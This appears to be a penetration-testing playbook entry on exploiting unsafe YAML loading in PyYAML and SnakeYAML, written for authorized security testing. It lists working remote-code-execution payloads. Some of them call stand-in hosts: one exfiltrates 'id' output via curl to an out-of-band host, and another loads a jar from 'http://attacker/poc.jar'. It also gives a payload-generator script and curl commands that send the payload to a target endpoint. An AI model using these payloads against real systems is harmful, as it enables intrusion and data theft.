# Python YAML Unsafe Load

## Purpose

Test Python and JVM applications that parse attacker-controlled YAML using unsafe loaders (`yaml.load` without `Loader`, SnakeYAML with default constructor), enabling code execution through `!!` type tags that instantiate arbitrary classes or invoke system calls.

## Applicability

- Python application using PyYAML `yaml.load(input)` without explicit `Loader=yaml.SafeLoader`
- Java application using SnakeYAML `new Yaml().load()` or `new Yaml().loadAll()` with default constructor
- Any application accepting YAML configuration, profile data, or structured input from users
- CI/CD pipelines, configuration APIs, or import endpoints accepting YAML files

## Preconditions

- User-controlled string or file content reaches `yaml.load()` (Python) or `new Yaml().load()` (SnakeYAML) without `SafeLoader` / `SafeConstructor`
- Python: `os` / `subprocess` / `builtins` modules accessible (standard)
- SnakeYAML: network access available for `URLClassLoader` gadget, OR classpath contains usable `ScriptEngine` / `SPI` factories

## Relevant Architecture

**Python PyYAML**
```
User input (YAML string)
    → yaml.load(input)            ← unsafe; no Loader argument
    → YAML parser resolves tags
    → !!python/object/apply → arbitrary callable invoked
    → os.system / subprocess RCE
```

**SnakeYAML (Java)**
```
User input (YAML string)
    → new Yaml().load(input)
    → tag resolution (!! tags)
    → Class.forName(tagClass) → constructor/setter invoked
    → URLClassLoader or ScriptEngineManager → remote class load / script exec
```

## Technical Knowledge

**PyYAML unsafe load triggers**
```python
yaml.load(data)  # DeprecationWarning in newer versions; still dangerous
yaml.load(data, Loader=yaml.Loader)  # Explicitly unsafe — same as no Loader
yaml.load(data, Loader=yaml.UnsafeLoader)
yaml.load_all(data)  # Multi-document; same issue
```

**PyYAML exploit payloads**
```yaml
# Execute command via python/object/apply
!!python/object/apply:os.system ['id']

# Subprocess with arguments
!!python/object/apply:subprocess.check_output [['id']]

# Using builtins exec
!!python/object/apply:builtins.exec ['import os; os.system("id")']

# OOB variant (replace with interactsh host)
!!python/object/apply:os.system ['curl http://<oast>/?q=$(id|base64 -w0)']
```

**SnakeYAML exploit payloads**
```yaml
# URLClassLoader — requires HTTP access to attacker server
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/poc.jar"]]]]

# DNS-only oracle (safe)
!!java.net.URL ["http://<interactsh-host>"]
# (triggers when URL object is used; may need to be inside a collection that iterates it)

# ScriptEngine alternative (if Nashorn/Rhino on classpath)
!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
# (combine with _bytecodes as in jackson approach)
```

**Detecting the SnakeYAML version**
- SnakeYAML 2.0+ changed default behavior — `Yaml()` now uses `SafeConstructor` by default
- SnakeYAML 1.x: `new Yaml()` is unsafe
- Confirm from error messages, jar manifest, or `pom.xml`/`build.gradle` in white-box

**PyYAML version behavior**
- PyYAML 5.1+: `yaml.load()` without `Loader` raises `YAMLLoadWarning` but still loads — still exploitable
- PyYAML 6.0: no change in exploitability; `yaml.safe_load()` is the safe API

## Indicators

**Black-box**
- Endpoint accepts YAML content type (`application/yaml`, `text/yaml`, `application/x-yaml`)
- `Content-Type` or file upload suggests YAML processing
- Error messages reference `yaml`, `SnakeYAML`, `YAMLException`, `ConstructorException`
- Application behavior changes when `!!` tags are included vs. stripped (tag processing active)

**White-box**
```python
# Python — vulnerable
yaml.load(user_input)
yaml.load(user_input, Loader=yaml.Loader)
yaml.load_all(user_input)

# Python — safe
yaml.safe_load(user_input)
yaml.load(user_input, Loader=yaml.SafeLoader)
yaml.load(user_input, Loader=yaml.CSafeLoader)
```

```java
// Java — vulnerable
new Yaml().load(input);
new Yaml().loadAll(input);
new Yaml(new Constructor(SomeClass.class)).load(input);  // still resolves !! tags

// Java — safe
new Yaml(new SafeConstructor()).load(input);
```

## Interpretation

1. **`YAMLLoadWarning`** logged but no error returned → PyYAML executing unsafe load; `!!` tags processed
2. **`ConstructorException: could not determine a constructor for the tag`** → tag processed but class not found; tag resolution is active — try existing classes
3. **`ClassNotFoundException`** in SnakeYAML → tag reaches class resolution; class not on classpath — try JDK-native classes
4. **OOB DNS/HTTP callback received** → code execution or class instantiation with network side effect confirmed
5. **Response contains command output** → blind-unnecessary; exec RCE confirmed

## Security-Relevant Conditions

- **PyYAML no `Loader` argument**: Directly exploitable via `!!python/object/apply`
- **SnakeYAML 1.x `new Yaml()`**: Default constructor resolves all `!!` tags; URLClassLoader gadget applicable if outbound HTTP possible
- **SnakeYAML 2.0+ `new Yaml()`**: SafeConstructor by default — test for explicit override with `new Constructor()` or `new Yaml(new Loader(new Resolver()))`
- **YAML parsed from user-uploaded config file**: high-risk pattern; file content entirely attacker-controlled
- **CI/CD config parsing**: pipeline YAML parsed server-side may reach unsafe loader

## Experiment Considerations

- Start with a URL instantiation as DNS oracle for SnakeYAML — lower impact than URLClassLoader chain
- For PyYAML, `os.system` is synchronous; output goes to server stdout — use OOB callback to capture
- Confirm PyYAML version to select correct tag syntax (`!!python/object/apply` vs. `!!python/object`)
- For SnakeYAML, prepare the `.jar` file at attacker HTTP server before testing the URLClassLoader payload
- Use `!!python/object/apply:time.sleep [10]` as safe timing oracle when OOB is blocked

## Evidence Expectations

1. Craft YAML payload with `!!python/object/apply:os.system` or SnakeYAML `URLClassLoader` gadget
2. OOB HTTP/DNS callback received → execution confirmed
3. Bounded exec output exfiltrated (`id`, `hostname`)
4. Document: endpoint URL, content-type, parameter/field name, PyYAML/SnakeYAML version, exact tag syntax used

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `yaml.scanner.ScannerError` on `!!` tag | YAML parse error — check tag syntax for target version |
| `ConstructorException: could not determine constructor` | Tag resolution active but class path wrong; try different class |
| PyYAML no `!!python` tag support | Application uses `yaml.safe_load()` — not vulnerable to this path |
| SnakeYAML 2.0 `SafeConstructor` restriction | Default changed; look for explicit unsafe constructor in code |
| URLClassLoader DNS fires but class not loaded | Outbound HTTP blocked or JAR format issue; check server logs |

## False Positives

- `yaml.safe_load()` used throughout — no `!!` tag resolution; not vulnerable
- `yaml.load()` present in source but called only with developer-controlled config files — verify data flow from user input
- SnakeYAML 2.0+ with default constructor and no explicit `Loader` override — safe by default in this version
- `!!` in YAML triggers but only to a known-safe set of types (custom `TypeDescription` whitelist)

## Limitations

- SnakeYAML URLClassLoader gadget requires outbound HTTP from the server; firewalled environments require classpath-only gadgets
- PyYAML `!!python/object/apply` requires the callable to be importable — sandboxed environments may restrict imports
- YAML multi-document (`---`) separators may be needed for some payload contexts
- Timing oracle (`time.sleep`) is Python-specific; SnakeYAML has no direct sleep gadget without exec

## Related Knowledge

- `python-pickle` — when sink is `pickle.loads()` rather than `yaml.load()`
- `java-polymorphic-json` — analogous type confusion in JSON parsers (Jackson, Fastjson)
- `java-native` — when SnakeYAML gadget chain pivots to `ObjectInputStream` (rare but possible)
- PyYAML CVE-2017-18342: `yaml.load()` without `Loader` RCE (the canonical reference)
- SnakeYAML CVE-2022-1471: default constructor change in 2.0 (SafeConstructor)

## Tooling

```python
#!/usr/bin/env python3
# yaml_payload.py
import base64

# OOB payload (PyYAML)
oob_cmd = "curl http://<interactsh-host>/?q=$(id|base64 -w0)"
payload_pyyaml_oob = f"!!python/object/apply:os.system ['{oob_cmd}']"
print("PyYAML OOB:", payload_pyyaml_oob)

# Timing oracle (PyYAML)
payload_pyyaml_sleep = "!!python/object/apply:time.sleep [10]"
print("PyYAML sleep:", payload_pyyaml_sleep)

# SnakeYAML DNS oracle
payload_snakeyaml_dns = '!!java.net.URL ["http://<interactsh-host>"]'
print("SnakeYAML DNS:", payload_snakeyaml_dns)
```

```bash
# Send PyYAML payload
curl -s -X POST \
  -H 'Content-Type: application/yaml' \
  -d "!!python/object/apply:os.system ['curl http://<oast>/?x=$(id|base64 -w0)']" \
  https://target/api/config

# File upload variant
curl -s -F 'file=@payload.yaml;type=application/yaml' https://target/api/import
```